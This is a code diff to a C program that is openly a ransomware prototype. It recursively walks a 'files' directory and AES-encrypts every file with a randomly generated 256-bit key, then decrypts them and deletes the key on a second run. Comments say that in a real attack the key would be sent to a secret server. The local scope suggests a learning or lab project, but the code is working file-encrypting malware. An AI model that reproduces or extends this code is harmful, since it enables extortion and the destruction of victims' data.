@@ -10,6 +10,11 @@
 #include <sys/stat.h>
 #include <unistd.h>
 
+#ifdef WIN32
+#include <io.h>
+#define F_OK 0
+#define access _access
+#endif
 #define BLOCK_SIZE 16 // AES uses 128-bit block size encryption
 
 void encrypt(unsigned char *key, char *fileName) {
@@ -123,13 +128,21 @@ int isDir(const char* fileName) {
     return S_ISDIR(path.st_mode);
 }
 
-void recursiveSearch(unsigned char *key, char *dirName) {
+void recursiveSearch(unsigned char *key, char *dirName, int encryption) {
     DIR *curr = opendir(dirName);
     struct dirent *entry;
 
-    if (!(curr = opendir(dirName)))
+    // Check if it is a directory, if not, encrypt/decrypt it
+    if (!(curr = opendir(dirName))) {
+        if (encryption == 1) {
+            encrypt(key, dirName);
+        } else {
+            decrypt(key, dirName);
+        }
         return;
+    }
 
+    // Iterate through dir
     while((entry=readdir(curr))) {
         char pathLocation[1024];
         // Ignore . and .. files (linux testing)
@@ -138,8 +151,9 @@ void recursiveSearch(unsigned char *key, char *dirName) {
         }
         snprintf(pathLocation, sizeof(pathLocation), "%s/%s", dirName, entry->d_name);
         printf("%s\n", pathLocation);
-        recursiveSearch(key, pathLocation);
+        recursiveSearch(key, pathLocation, encryption);
     }
+    closedir(curr);
 }
 
 int main (int argc, char *argv[]) {
@@ -147,27 +161,30 @@ int main (int argc, char *argv[]) {
     int num_bytes = 32; // 256-bit key size
     unsigned char *key = malloc(num_bytes);
     FILE *f_key;
-
-    // Generate the key
-    RAND_bytes(key, 32);
-
-    // Write the key to a file -- in an actual attack, this would be sent to a super secret server
-    // I might add the functionality for this key to be sent to a server later on
-    if (argc <= 1) {
-        f_key = fopen("key.txt", "wb");
-        fwrite(key, 1, 32, f_key);
-        fclose(f_key);
-    } else {
-        f_key = fopen("key.txt", "rb");   
+    int encryption;
+    char keyFile[] = "key.txt";
+    // Check if the key file exists, if it doesn't make it
+    // This is temporary, normally this would be sent to a secret server
+    if ((f_key = fopen(keyFile, "rb"))) {
         fread(key, 32 + 1, 1, f_key);
         fclose(f_key);
+        encryption = 0;
+    } else {
+        // Generate the key
+        RAND_bytes(key, 32);
+        f_key = fopen(keyFile, "wb");
+        fwrite(key, 1, 32, f_key);
+        fclose(f_key);
+        encryption = 1;
     }
     
     // Set the starting point for the recursion to search from.
     // Anything below this directory will not be scanned and encrypted.
     char directory[] = "files";
-    recursiveSearch(key, directory);
-    scanf("waiting...");
+    recursiveSearch(key, directory, encryption);
+    if (encryption == 0) {
+        remove(keyFile);
+    }
     // We don't like our keys being stored in the memory
     free(key);
     return 0;
